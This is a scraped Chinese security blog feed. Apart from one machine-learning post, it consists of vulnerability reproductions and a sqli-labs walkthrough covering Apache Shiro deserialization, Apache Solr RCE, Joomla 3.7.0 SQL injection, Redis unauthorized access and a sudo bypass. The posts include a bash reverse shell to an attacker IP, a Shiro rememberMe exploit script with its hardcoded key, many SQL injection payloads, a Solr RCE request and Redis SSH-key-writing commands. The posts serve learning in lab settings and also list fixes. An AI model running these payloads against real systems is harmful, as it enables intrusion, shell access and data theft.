获取操作序列 with open(filename, &#x27;r&#x27;, encoding=&quot;utf-8&quot;) as f: cmd = f.readline() temp = [] cnt = 0 while(cmd): cmd_list.append(cmd.strip(&#x27;\\n&#x27;)) temp.append(cmd.strip(&#x27;\\n&#x27;)) cnt = cnt + 1 if(cnt == 150): # 这里不按照书上的分，我这里按照150个命令为一个序列，刚好和标签对上号，因为标签只有100个值 cmd_seq.append(temp) cnt = 0 temp = [] cmd = f.readline() Step 2：然后将user日志中所有的命令进行统计，统计出它们最频繁的50个命令，以及最不频繁的50个命令 1234# 获取最频繁的前50个命令，获取最不频繁的前50个命令fdist = sorted(FreqDist(cmd_list).items(),key = operator.itemgetter(1), reverse = True) # 按照出现频率排序most_cmd = [ item[0] for item in fdist[:50]]mini_cmd = [ item[0] for item in fdist[-50:]] Step 3：特征化。在 Step 1 的操作序列上，我们按一个操作系列为单元，①统计其中不重复的命令个数、②最频繁的10个命令、③最不频繁的10个命令 1234567891011user_feature = [] for cmd_list in user_cmd_list: # 获取每个序列不重复命令的个数 seq_len = len(set(cmd_list)) # 将每个序列按照出现频率由高到低的排列命令 fdist = sorted(FreqDist(cmd_list).items(), key=operator.itemgetter(1), reverse=True) seq_freq = [item[0] for item in fdist] # 获取最频繁和最不频繁的前10个命令 f2 = seq_freq[:10] f3 = seq_freq[-10:] Step 4：因为KNN只能接收数值类型输入。在 Step 4 中，②和③都是字符串的命令，我们需要将其标量化。标量化的方式：统计最频繁使用的50个命令和最不频繁使用的50个命令计算重合程度 123456# 计算重合度f2 = len(set(f2) &amp; set(user_max_freq))f3 = len(set(f3) &amp; set(user_min_freq))# 合并特征：①每个序列不重复的命令个数；②每个序列最频繁的前10个命令和user中最频繁的50个命令重合度；# ③每个序列最不频繁的前10个命令和user中最不频繁的前50个命令重合度；user_feature.append([seq_len, f2, f3]) python3完整代码如下1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586from nltk.probability import FreqDist # 统计命令出现频率import operatorfrom sklearn.neighbors import KNeighborsClassifierimport numpy as npdef load_user(filename): most_cmd = [] mini_cmd = [] cmd_list = [] cmd_seq = [] # 获取操作序列 with open(filename, &#x27;r&#x27;, encoding=&quot;utf-8&quot;) as f: cmd = f.readline() temp = [] cnt = 0 while(cmd): cmd_list.append(cmd.strip(&#x27;\\n&#x27;)) temp.append(cmd.strip(&#x27;\\n&#x27;)) cnt = cnt + 1 if(cnt == 150): # 这里不按照书上的分，我这里按照150个命令为一个序列，刚好和标签对上号，因为标签只有100个值 cmd_seq.append(temp) cnt = 0 temp = [] cmd = f.readline() # 获取最频繁的前50个命令，获取最不频繁的前50个命令 fdist = sorted(FreqDist(cmd_list).items(),key = operator.itemgetter(1), reverse = True) # 按照出现频率排序 most_cmd = [ item[0] for item in fdist[:50]] mini_cmd = [ item[0] for item in fdist[-50:]] return cmd_seq, most_cmd, mini_cmddef get_user_feature(user_cmd_list, user_max_freq, user_min_freq): user_feature = [] for cmd_list in user_cmd_list: # 获取每个序列不重复命令的个数 seq_len = len(set(cmd_list)) # 将每个序列按照出现频率由高到低的排列命令 fdist = sorted(FreqDist(cmd_list).items(), key=operator.itemgetter(1), reverse=True) seq_freq = [item[0] for item in fdist] # 获取最频繁和最不频繁的前10个命令 f2 = seq_freq[:10] f3 = seq_freq[-10:] # 计算重合度 f2 = len(set(f2) &amp; set(user_max_freq)) f3 = len(set(f3) &amp; set(user_min_freq)) # 合并特征：①每个序列不重复的命令个数；②每个序列最频繁的前10个命令和user中最频繁的50个命令重合度；③每个序列最不频繁的前10个命令和user中最不频繁的前50个命令重合度； user_feature.append([seq_len, f2, f3]) return user_featuredef get_labels(filename): # 获取第三列的标签 labels = [] cnt = 0 with open(filename, &#x27;r&#x27;, encoding=&quot;utf-8&quot;) as f: temp = f.readline().strip(&#x27;\\n&#x27;) while(temp): labels.append(int(temp[4])) cnt += 1 temp = f.readline().strip(&#x27;\\n&#x27;) return labelsif __name__ == &quot;__main__&quot;: user_cmd_list, user_max_freq, user_min_freq = load_user(&#x27;user.txt&#x27;) user_feature = get_user_feature(user_cmd_list, user_max_freq, user_min_freq) labels = get_labels(&#x27;labels.txt&#x27;) # 切割数据集：训练集和测试集 x_train = user_feature[0:70] y_train = labels[0:70] x_test = user_feature[70:] y_test = labels[70:] # 训练数据 neight = KNeighborsClassifier(n_neighbors=3) neight.fit(x_train, y_train) # 预测 y_predict = neight.predict(x_test) # 计算得分 score = np.mean(y_test == y_predict) * 100 print(score) 1# 90.0 最终获得90%的正确率。 总结①获取最频繁的前50个命令，书上的方式获取的并不是最频繁的前50个。在这里我改了下代码。②标签和数据对不上号，命令共有15000个，标签只有100个。书上的做法是每100个为一个操作序列，也就是有150个操作序列，然后在标签出再前面增加了50个标签。我的代码是将150个命令作为一个序列，这样下来刚好合适。","categories":[],"tags":[{"name":"机器学习","slug":"机器学习","permalink":"http://example.com/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"}]},{"title":"Apache Shiro 复现","slug":"Apache-Shiro-复现","date":"2019-12-10T14:23:07.000Z","updated":"2020-01-10T15:52:33.069Z","comments":true,"path":"2019/12/10/Apache-Shiro-复现/","link":"","permalink":"http://example.com/2019/12/10/Apache-Shiro-%E5%A4%8D%E7%8E%B0/","excerpt":"Apache Shiro 反序列化漏洞简介Apache Shiro 是ASF旗下的一款开源软件（Shiro发音为“shee-roh”，日语“堡垒（Castle）”的意思），提供了一个强大而灵活的安全框架。可为任何应用提供安全保障— 从命令行应用、移动应用到大型网络及企业应用。 Apache Shiro提供了认证、授权、加密和会话管理功能，将复杂的问题隐藏起来，提供清晰直观的API使开发者可以很轻松地开发自己的程序安全代码。并且在实现此目标时无须依赖第三方的框架、容器或服务，当然也能做到与这些环境的整合，使其在任何环境下都可拿来使用。","text":"Apache Shiro 反序列化漏洞简介Apache Shiro 是ASF旗下的一款开源软件（Shiro发音为“shee-roh”，日语“堡垒（Castle）”的意思），提供了一个强大而灵活的安全框架。可为任何应用提供安全保障— 从命令行应用、移动应用到大型网络及企业应用。 Apache Shiro提供了认证、授权、加密和会话管理功能，将复杂的问题隐藏起来，提供清晰直观的API使开发者可以很轻松地开发自己的程序安全代码。并且在实现此目标时无须依赖第三方的框架、容器或服务，当然也能做到与这些环境的整合，使其在任何环境下都可拿来使用。 摘自：https://blog.csdn.net/peterwanghao/article/details/7997169 影响范围Apache Shiro &lt;= 1.2.4 环境搭建 一个Linux系统搭建 apache shiro Ubuntu系统充当攻击机 一个Windows 10 (其实不要也行) 搭建 apache shiro 环境下载docker容器 1docker pull medicean&#x2F;vulapps:s_shiro_1 运行docker 1docker run -d -p 8080:8080 medicean&#x2F;vulapps:s_shiro_1 访问：http://192.168.43.200:8080 利用工具准备主要工具：yoserial.jar 先安装 maven 1apt install maven 下载及安装 yoserial： 12345git clone https:&#x2F;&#x2F;github.com&#x2F;frohoff&#x2F;ysoserial.gitcd ysoserial&#x2F;mvn clean package -DskipTests 可一看下安装成功了 1java -cp ysoserial-0.0.6-SNAPSHOT-all.jar 将 ysoserial-0.0.6-SNAPSHOT-all.jar 重命名为 ysoserial.jar，因为后面要使用的 shiro.py 脚本中指定了 ysoserial.jar 名字调用，也可以修改脚本中的名称。 漏洞利用Step 1：攻击机先监听 666 端口，用于接收到时候的反弹的 shell 1root@unihac:~# nc -lvp 666 Step 2：将需要在目标机器上执行的反弹命令加密。 命令加密网址：http://www.jackson-t.ca/runtime-exec-payloads.html 需要加密的命令： 1bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.43.146&#x2F;666 0&gt;&amp;1 Step 3： 用 yoserial.jar 监听一个端口 1root@unihac:target# java -cp ysoserial.jar ysoserial.exploit.JRMPListener 6666 CommonsCollections4 &#39;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQzLjE0Ni82NjYgMD4mMQ&#x3D;&#x3D;&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#39; Step 4：利用shiro.py 向 java 发送生成poc 1python shiro.py 192.168.43.146:6666 注意：python 版本为2.7 Step 5：先打开burpsuite，取消掉拦截，但要让流量经过burp。在Windows中访问 http://192.168.43.200:8080 在 history 中找到这样的请求包 将其发送到 Repeater 中 然后将我们在上一步获取到的 RememberMe 添加到 cookie 中。 发送出去。 Step 6：大功告成 看下之前的 nc 监听的端口，可以看到已经返回了shell 漏洞原因 Apache Shiro默认使用了CookieRememberMeManager，其处理cookie的流程是：得到rememberMe的cookie值 &gt; Base64解码–&gt;AES解密–&gt;反序列化。然而AES的密钥是硬编码的，就导致了攻击者可以构造恶意数据造成反序列化的RCE漏洞。 摘自 漏洞修复升级到最新版本 漏洞挖掘使用网络空间搜索引擎，例如shadon、zoomeye、fofa等等进行扫描 使用fofa 搜索 title=”apache shiro *” 或者 app=”jeesite”，全是apache shiro的 例如：使用fofa 搜索app=”jeesite” 借鉴：https://mp.weixin.qq.com/s/8F5tmbJsE0SshrYK-fRl-g 附件123456789101112131415161718192021import sysimport uuidimport base64import subprocessfrom Crypto.Cipher import AES def encode_rememberme(command): popen &#x3D; subprocess.Popen([&#39;java&#39;, &#39;-jar&#39;, &#39;ysoserial.jar&#39;, &#39;JRMPClient&#39;, command], stdout&#x3D;subprocess.PIPE) BS &#x3D; AES.block_size pad &#x3D; lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode() key &#x3D; base64.b64decode(&quot;kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;&quot;) iv &#x3D; uuid.uuid4().bytes encryptor &#x3D; AES.new(key, AES.MODE_CBC, iv) file_body &#x3D; pad(popen.stdout.read()) base64_ciphertext &#x3D; base64.b64encode(iv + encryptor.encrypt(file_body)) return base64_ciphertext if __name__ &#x3D;&#x3D; &#39;__main__&#39;: payload &#x3D; encode_rememberme(sys.argv[1]) print &quot;rememberMe&#x3D;&#123;0&#125;&quot;.format(payload.decode())","categories":[],"tags":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"http://example.com/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"}]},{"title":"Sqli-labs通关","slug":"sqli-labs","date":"2019-12-10T14:23:07.000Z","updated":"2021-02-04T03:25:52.321Z","comments":true,"path":"2019/12/10/sqli-labs/","link":"","permalink":"http://example.com/2019/12/10/sqli-labs/","excerpt":"sqli-labs通关Basic Challenges(1-18关)","text":"sqli-labs通关Basic Challenges(1-18关) 第一关：单引号报错注入那就加一个单引号看看情况嘛 http://localhost/sqli-labs/Less-1/?id=1&#39; 那么流程直接往下走，没有任何过滤 1234567891011# 获取数据库名-1&#39; union select 1,2,group_concat(schema_name) from information_schema.schemata -- +# 获取表名-1&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;security&#39; -- +# 获取列名-1&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39; -- +# 获取数据-1&#39; union select 1,2,group_concat(&quot;&#x2F;&quot;, username,&quot; : &quot;, password) from users -- + 经验 我发现在-- + 后面的+可以换成任何符号，都能实现注释。例如：-- 0o0 但是，如果不加任何字符就会报错，如： 还有这里直接使用 # 不能实现注入，然后看了下后端代码没有任何处理，理论上不应该 为什么非要编码成 %23 这里的原因也困扰了我好久，借用别人已经探究过的博客：传送门 第二关：整形注入把所有注入语句中的 id=1&#39; 变成 id=1 后面其他字符串不变。即可 第三关：单引号+括号尝试一下：http://localhost/sqli-labs/Less-3/?id=1&#39; 那就闭合一下括号 1id&#x3D;-1&#39;) union select 1,2,group_concat(schema_name) from information_schema.schemata -- + 步骤和上面一样 第四关：双引号+括号访问：http://localhost/sqli-labs/Less-4/?id=1&quot; 通过引号配对，看出多了个双引号和括号。直接构造payload： 1id&#x3D;1&quot;) --+ 注入同上。 第五关：报错注入(单引号)访问网站：http://localhost/sqli-labs/Less-5/?id=2&#39; 单引号报错 使用payload，并不会回显：http://localhost/sqli-labs/Less-5/?id=2&#39; union select 1,2,3 -- + 但是它可以显示错误的sql语句信息，这时候就可以采用报错回显的方式进行注入。 报错注入方式： floor报错注入 替换其中的payload即可 123456789and (select 1 from (select count(*),concat((payload),floor(rand(0)*2))x from information_schema.tables group by x)a) 如下,猜测数据库?id&#x3D;2&#39; and (select 1 from (select count(*),concat((select concat(schema_name) from information_schema.schemata limit 5,1),floor(rand(0)*2))x from information_schema.tables group by x)a) -- +猜表名http:&#x2F;&#x2F;localhost&#x2F;sqli-labs&#x2F;Less-5&#x2F;?id&#x3D;2&#39; and (select 1 from (select count(*),concat((select concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;security&#39; limit 3,1),floor(rand(0)*2))x from information_schema.tables group by x)a) -- +看着来吧，不写了。 extractvalue 报错注入(能查询字符串的最大长度为32) 12?id&#x3D;2&#39; and extractvalue(1, concat(0x5c, (payload))) -- +# payload 部分和上面完全一样 updatexml (能查询字符串的最大长度为32) 1?id&#x3D;2&#39; and 1&#x3D;(updatexml(1,concat(0x3a,(payload)),1)) -- + 其他各种报错注入方式：https://www.jianshu.com/p/bc35f8dd4f7c 这道题还可以用盲注 第六关：报错注入(双引号)和上面类似，就只是把 id=2&#39; 改成 id=2&quot; 第七关：outfile方式读取这个有点神奇哦，先要尝试各种报错，看看要不要闭合引号、括号之类的。我们输入下面这个payload，它不报错。 1http:&#x2F;&#x2F;localhost&#x2F;sqli-labs&#x2F;Less-7&#x2F;?id&#x3D;2&quot; %23 我的猜测是，他将 &quot;# 当成单引号里面的内容了，也就是在没遇到下一个单引号之前，所有的输入都会当成单引号里面的内容。看源码是这样的： 1http:&#x2F;&#x2F;localhost&#x2F;sqli-labs&#x2F;Less-7&#x2F;?id&#x3D;2&quot; %23 然后就闭合呗，因为这里不能使用回显注入，报错也不回显了。那就只能用盲注了。 一般上传webshell可以用这种方法，但是用这种方法来实现注入有点大材小用的感觉。满足条件： 知道网站绝对路径 开启security_priv_file 1 访问文件即可。注意上面每次导出的时候，名字不能重复，会导致失败 第八关：布尔型注入没有回显，用 id=1&#39; and 1=1 -- + 和 id=1&#39; and 1=0 -- + 判断怎么闭合。如果前一个有显示，后一个没显示，那么就可以猜测后端需要通过闭合单引号实现注入。 接下来需要猜测数据库名字，这时候没有显示只能一个一个字母来进行猜测了。下面说下原理就行了，挨个挨个才比较麻烦，直接上sqlmap 12# 第一个数据库的第一个字母 是否大于 a?id&#x3D;1&#39; and substr((select schema_name from information_schema.schemata limit 0,1),1,1) &gt; &#39;a&#39; -- + 说明大于a 12# 第一个数据库的第二个字母 是否大于 s?id&#x3D;1&#39; and substr((select schema_name from information_schema.schemata limit 0,1),1,1) &gt; &#39;s&#39; -- + 说明小于a 12是否等于 i?id&#x3D;1&#39; and substr((select schema_name from information_schema.schemata limit 0,1),1,1) &#x3D; &#39;i&#39; -- + 说明第一个数据库的第一个字母是 i 然后不断调整substr函数截取的字母，就能猜出第一个数据的全名，然后移动 limit 后的数字继续猜测第二数据库名字。不多说了。 第九关：单引号+时间盲注一直不太清楚基于时间盲注和布尔型注入的区别，做了一遍题，才深有体会。同样需要看看怎么闭合引号、括号。你会发现在这里，不管你怎么输入，都不会有异常显示出来。这时候就考虑下延时注入。 使用下面的payload，会延时10s，说明是闭合单引号的时间盲注 1http:&#x2F;&#x2F;localhost&#x2F;sqli-labs&#x2F;Less-9&#x2F;?id&#x3D;2&#39; and sleep(10) -- + 这时候就可以构造payload了，步骤和上面基本类似，挨个挨个字母判断： 1?id&#x3D;2&#39; and if(substr((select schema_name from information_schema.schemata limit 0,1),1,1)&#x3D;&#39;i&#39;, sleep(10), 1) -- + 对照着上面来。不写了。 第十关：双引号+时间盲注把 ?id=2&#39; 换成 ?id=2&quot; 其他的都不变。参考第九关 第十一关：POST注入 输入用户名：name 密码：pass’ # 输入用户名：name’ # 密码：pass 均没有报错，猜测用户名和密码都可是注入。然后就开始各种尝试了 用户名处注入 用户名输入一个数据库中不存在的，因为报错了才能回显，如我这里输入用户名：/&#39; union select version(),2 #，输入密码：123456 看到数据库版本： 密码处注入 用户名随便输，密码写成：pass&#39; union select version(),2 # 就能看到version了 剩下的就和回显注入一模一样了。不多说了 第十二关：双引号+括号+回显注入 用户名：admin 密码：123”) union select version(),2 # 得到返回结果： 和上面重复率太高，不写了。 第十三关：单引号+括号+报错型注入 用户名：admin’) and (select 1 from (select count(*),concat((select concat(schema_name) from information_schema.schemata limit 5,1),floor(rand(0)*2))x from information_schema.tables group by x)a) # 密码：随便写 第十四关：双引号+报错注入 输入用户名：admin’) and 1=1 # 输入密码：123 报错信息如下： 构造payload 用户名：admin’) and (select 1 from (select count(*),concat((select concat(schema_name) from information_schema.schemata limit 5,1),floor(rand(0)*2))x from information_schema.tables group by x)a) # 密码：随便写 不搞了。 第十五关：单引号+布尔型盲注 用户名：admin’ and substr((select schema_name from information_schema.schemata limit 0,1),1,1) &gt; ‘a’ 密 码：随便写 通过是否登录成功判断每个字母的正确性。参考第八关 第十六关：双引号+布尔型注入 用户名：admin“ and substr((select schema_name from information_schema.schemata limit 0,1),1,1) &gt; ‘a’ 密 码：随便写 通过是否登录成功判断每个字母的正确性。参考第八关 第十七关：单引号+报错注入 用户名：admin 密 码：123’ and extractvalue(1,concat(0x7e,(payload),0x7e))# 一直尝试时间注入，回车后网页一直加载不出来。 看下源码 1$update&#x3D;&quot;UPDATE users SET password &#x3D; &#39;$passwd&#39; WHERE username&#x3D;&#39;$row1&#39;&quot;; 然后在mysql命令行中尝试了下 最后发现要想使用时间注入，你要把后面哪个用户名给加上才行。也就是： 用户名：admin 密 码：123’ where username=’admin’ and sleep(10) # 郁闷一分钟。","categories":[{"name":"sql注入练习","slug":"sql注入练习","permalink":"http://example.com/categories/sql%E6%B3%A8%E5%85%A5%E7%BB%83%E4%B9%A0/"}],"tags":[{"name":"靶机训练","slug":"靶机训练","permalink":"http://example.com/tags/%E9%9D%B6%E6%9C%BA%E8%AE%AD%E7%BB%83/"}]},{"title":"Apache Solr 远程命令执行漏洞复现","slug":"Apache-Solr-远程命令执行漏洞复现","date":"2019-11-05T15:07:13.000Z","updated":"2019-11-06T08:12:33.225Z","comments":true,"path":"2019/11/05/Apache-Solr-远程命令执行漏洞复现/","link":"","permalink":"http://example.com/2019/11/05/Apache-Solr-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/","excerpt":"CVE-2019-0193：Apache Solr 远程命令执行漏洞复现Apache solr 介绍Apache Solr 是一个开源的搜索服务器。Solr 使用 Java 语言开发，主要基于 HTTP 和 Apache Lucene 实现。 影响范围Solr &lt;= 8.2.0且开启了dataimport功能(目前无补丁)","text":"CVE-2019-0193：Apache Solr 远程命令执行漏洞复现Apache solr 介绍Apache Solr 是一个开源的搜索服务器。Solr 使用 Java 语言开发，主要基于 HTTP 和 Apache Lucene 实现。 影响范围Solr &lt;= 8.2.0且开启了dataimport功能(目前无补丁) 环境搭建下载地址：http://www.apache.org/dyn/closer.lua/lucene/solr/7.7.2/solr-7.7.2.zip 在solr-7.7.2目录中，执行命令 bin/solr -e dih 访问 http://127.0.0.1:8983 漏洞利用通过接口 curl http://127.0.0.1:8983/solr/admin/cores 获取所有 core 信息，下面我们构造 payload 需要 name 信息 使用burpsuite发送下面包。替换相应的就行。 12345678910111213141516171819202122232425POST &#x2F;solr&#x2F;&lt;修改这里&gt;&#x2F;dataimport HTTP&#x2F;1.1Host: 10.10.10.22:8983Content-Length: 496User-Agent: Mozilla&#x2F;5.0Content-type: application&#x2F;x-www-form-urlencodedConnection: closecommand&#x3D;full-import&amp;verbose&#x3D;false&amp;clean&#x3D;false&amp;commit&#x3D;true&amp;debug&#x3D;true&amp;core&#x3D;&lt;修改这里&gt;&amp;name&#x3D;dataimport&amp;dataConfig&#x3D;&lt;dataConfig&gt;&lt;dataSource type&#x3D;&quot;URLDataSource&quot;&#x2F;&gt;&lt;script&gt;&lt;![CDATA[function poc(row)&#123;var process&#x3D; java.lang.Runtime.getRuntime();process.exec(&quot;calc.exe&quot;);return row;&#125;]]&gt;&lt;&#x2F;script&gt;&lt;document&gt;&lt;entity name&#x3D;&quot;stackoverflow&quot;url&#x3D;&quot;https:&#x2F;&#x2F;stackoverflow.com&#x2F;feeds&#x2F;tag&#x2F;solr&quot;processor&#x3D;&quot;XPathEntityProcessor&quot;forEach&#x3D;&quot;&#x2F;feed&quot;transformer&#x3D;&quot;script:poc&quot; &#x2F;&gt;&lt;&#x2F;document&gt;&lt;&#x2F;dataConfig&gt; 上面的命令是弹出计算机。 尝试了多次，有时候能成功。感觉，不好使用。 给出一个POC：https://github.com/jas502n/CVE-2019-0193/blob/master/CVE-2019-0193.py 漏洞修复1.升级到最新版本,设置enable.dih.dataConfigParam为false(目前最新版本为8.2.0) 2.暂时关闭dataimport功能","categories":[],"tags":[{"name":"Solr 远程命令执行","slug":"Solr-远程命令执行","permalink":"http://example.com/tags/Solr-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"},{"name":"CVE-2019-0193","slug":"CVE-2019-0193","permalink":"http://example.com/tags/CVE-2019-0193/"}]},{"title":"joomla之sql注入","slug":"joomla之sql注入","date":"2019-11-05T13:06:27.000Z","updated":"2019-11-06T08:12:49.275Z","comments":true,"path":"2019/11/05/joomla之sql注入/","link":"","permalink":"http://example.com/2019/11/05/joomla%E4%B9%8Bsql%E6%B3%A8%E5%85%A5/","excerpt":"Joomla 3.7.0 Core com_fields组件SQL注入简介joomla是国外的一款内容管理系统，属于Portal（企业入口网站）类型，比较适合作为商业类型的网站程序源码。Joomla!采用时下流行的PHP语言和MySQL数据库开发的网站内容管理系统，支持在Linux、Windows和MacOSX等不同的平台上执行，是全球最受欢迎的开源CMS内容管理系统之一。 漏洞危害攻击者可以通过sql注入获取到数据库内所有用户信息，如果数据库权限比较大，攻击者可以直接获取到服务器的权限等。","text":"Joomla 3.7.0 Core com_fields组件SQL注入简介joomla是国外的一款内容管理系统，属于Portal（企业入口网站）类型，比较适合作为商业类型的网站程序源码。Joomla!采用时下流行的PHP语言和MySQL数据库开发的网站内容管理系统，支持在Linux、Windows和MacOSX等不同的平台上执行，是全球最受欢迎的开源CMS内容管理系统之一。 漏洞危害攻击者可以通过sql注入获取到数据库内所有用户信息，如果数据库权限比较大，攻击者可以直接获取到服务器的权限等。 环境搭建 可以直接用docker：https://github.com/vulhub/vulhub/tree/master/joomla/CVE-2017-8917 直接登录http://target:8080/。 网站源码：https://github.com/joomla/joomla-cms/releases/download/3.7.0/Joomla_3.7.0-Stable-Full_Package.zip 进入安装界面 确认安装即可。 访问主页 漏洞利用访问 /index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml(1,concat(0x3e,user()),0) 使用sqlmap直接能跑出来 1python2 sqlmap.py -u &quot;http:&#x2F;&#x2F;10.10.10.24&#x2F;index.php?option&#x3D;com_fields&amp;view&#x3D;fields&amp;layout&#x3D;modal&amp;list[fullordering]&#x3D;updatexml*&quot; 进一步渗透思路获取网站后台登录的用户名密码 —》 上传shell –》 菜刀连接 获取mysql用户名的hash –》 解密 –》 远程连接mysql –》 写入木马 –》菜刀连接 修复建议 及时到官网更新最新版本的joomla 一定要将数据库的用户权限最小化，以免带来更大的危险","categories":[],"tags":[{"name":"sql注入","slug":"sql注入","permalink":"http://example.com/tags/sql%E6%B3%A8%E5%85%A5/"},{"name":"joomla","slug":"joomla","permalink":"http://example.com/tags/joomla/"}]},{"title":"redis未授权访问","slug":"redis未授权访问","date":"2019-10-22T14:04:33.000Z","updated":"2019-11-04T15:11:27.231Z","comments":true,"path":"2019/10/22/redis未授权访问/","link":"","permalink":"http://example.com/2019/10/22/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/","excerpt":"Redis未授权访问Redis默认在安装完成后绑定在 0.0.0.0:6379。并且安装完成后没有设置密码。因此在没有添加防火墙规则、避免其他非信任来源IP访问，这样就会使得Redis服务完全暴露在公网上。就可以导致任意用户访问目标机器。然后攻击者可以利用Redis自身提供的config命令，对文件读写操作。攻击者可以向服务器中写入webshell或者上传自己的ssh公钥到目标服务器上，实现免密登录服务器。","text":"Redis未授权访问Redis默认在安装完成后绑定在 0.0.0.0:6379。并且安装完成后没有设置密码。因此在没有添加防火墙规则、避免其他非信任来源IP访问，这样就会使得Redis服务完全暴露在公网上。就可以导致任意用户访问目标机器。然后攻击者可以利用Redis自身提供的config命令，对文件读写操作。攻击者可以向服务器中写入webshell或者上传自己的ssh公钥到目标服务器上，实现免密登录服务器。 漏洞危害 如果 redis 是以 root 用户身份运行，那么直接可以通过 config 命令上传公钥，直接通过 ssh 免密登录受害者服务器 攻击者可以通过 EVAL 执行 lua 代码，或通过数据备份功能往磁盘中写入后门文件 攻击者可以直接登录到系统，查看数据，可能导致敏感信息泄露 攻击者也可以通过 flushall 清空所有的数据，造成信息损失 漏洞影响范围目前受影响的Redis范围为：2.x，3.x，4.x，5.x 漏洞复现攻击机：10.10.10.11 在攻击机和靶机上都安装redis，下载位置：http://distfiles.macports.org/redis/redis-2.8.17.tar.gz 在靶机上执行 12345678910wget http:&#x2F;&#x2F;distfiles.macports.org&#x2F;redis&#x2F;redis-2.8.17.tar.gz # 下载tar xf redis-2.8.17.tar.gz &amp;&amp; cd redis-2.8.17&#x2F;make# 下面将redis-server和redis-cli拷贝到&#x2F;usr&#x2F;bin目录下（这样启动redis-server和redis-cli就不用每次都进入安装目录了cp src&#x2F;redis-cli &#x2F;usr&#x2F;bin&#x2F; cp src&#x2F;redis-server &#x2F;usr&#x2F;bin&#x2F;cp redis.conf &#x2F;etc 在靶机上运行redis服务 1redis-server &#x2F;etc&#x2F;redis.conf 至此漏洞利用环节搭建成功。 漏洞利用在攻击机上同样按照上面的方式安装redis，因为需要用户redis-cli客户端软件连接redis 敏感信息泄露攻击机用客户端软件直接连接靶机： 1redis-cli -h 10.10.10.11 通过 info 命令直接查看系统信息 查看数据库的数据 删除数据库信息 12del username &#x2F;&#x2F;删除键为username的数据flushall &#x2F;&#x2F; 删除所有数据 写入ssh公钥，实现免密连接实现原理： 在数据库中插入一条数据，将本机的公钥作为value，key值随意，然后通过修改数据库的默认路径为/root/.ssh和默认的缓冲文件authorized.keys，把缓冲的数据保存在文件里，这样就可以在服务器端的/root/.ssh下生成一个授权的key。 利用条件：需要确认自己是否有root权限，可以尝试切换目录到root下。如果没有权限，就不能通过这个方法利用。如下面，就是没有权限 首先在自己电脑上生成公私钥对。 12del username &#x2F;&#x2F;删除键为username的数据flushall &#x2F;&#x2F; 删除所有数据 将公钥写入到pubkey.txt中（前后用换行符隔开，避免与redis里其他缓存数据混合），然后将公钥写入到目标机器的缓冲里 123(echo -e &quot;\\n\\n&quot;; cat ~&#x2F;.ssh&#x2F;id_rsa.pub; echo -e &quot;\\n\\n&quot;) &gt; pubkey.txt 保存到txt文件中cat pubkey.txt | redis-cli -h 10.10.10.11 -x set var 写入到靶机缓冲中 设置redis的备份路径为/root/.ssh和缓冲文件名authorized_keys 1234567891011redis-cli -h 10.10.10.11 # 连接靶机config get dir # 获取当前备份路径config set dir &quot;~&#x2F;root&#x2F;.ssh&quot; # 把备份路径改到~&#x2F;root&#x2F;.sshconfig set dbfilename authorized_keys # 设置缓冲文件名save # 将数据保存在服务器硬盘上（缓存里的数据key.txt）exit # 退出 这时候就可以实现远程免密连接 1ssh -i ~&#x2F;.ssh&#x2F;id_rsa 10.10.10.11 上传webshell写入的方法和上面方法同样 利用条件： 目标机器有web服务器 已经知道网站的位置 将webshell上传。和上面一样，不多费口舌了 连接执行命令 web界面没问题，用菜刀始终没链接成功，不知道哪里有问题。自行尝试吧 欢迎大佬指点！ 再附上一个exp：https://github.com/vulhub/redis-rogue-getshell 写入定时任务我没做成功，一直没有给我反弹shell，也是郁闷。参考资料 漏洞修复 安装完redis之后，需要设置高强度密码 限定Redis的访问IP，控制未知来源访问 修改redis的默认端口，增强安全防护 配置rename-command配置项”RENAME_CONFIG”，这样即使存在未授权访问，也能够给攻击者使用config 指令加大难度 禁止Redis以root用户身份启动","categories":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"http://example.com/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"}],"tags":[]},{"title":"Linux权限绕过","slug":"Linux权限绕过","date":"2019-10-15T10:56:38.000Z","updated":"2021-02-04T05:16:36.710Z","comments":true,"path":"2019/10/15/Linux权限绕过/","link":"","permalink":"http://example.com/2019/10/15/Linux%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/","excerpt":"Linux sudo root权限绕过（CVE-2019-14287）漏洞概述如果将sudo配置为允许用户以任意用户身份运行命令，则可以通过指定用户ID为-1或4294967295的方式以root身份运行命令。这是因为将用户ID转换为用户名的函数，会将-1（或等效的4294967295）误认为0，而这正好是root用户的User ID。此外，由于通过-u选项指定的User ID在密码数据库中不存在，因此不会运行任何PAM会话模块。该漏洞影响版本1.8.28之前的所有Sudo版","text":"Linux sudo root权限绕过（CVE-2019-14287）漏洞概述如果将sudo配置为允许用户以任意用户身份运行命令，则可以通过指定用户ID为-1或4294967295的方式以root身份运行命令。这是因为将用户ID转换为用户名的函数，会将-1（或等效的4294967295）误认为0，而这正好是root用户的User ID。此外，由于通过-u选项指定的User ID在密码数据库中不存在，因此不会运行任何PAM会话模块。该漏洞影响版本1.8.28之前的所有Sudo版 刚出炉的漏洞，还烫手。 影响范围小于1.8.28版本的sudo 漏洞复现查看当前用户 在sudoer中添加 用户名 ALL=(ALL, !root) /usr/bin/vim 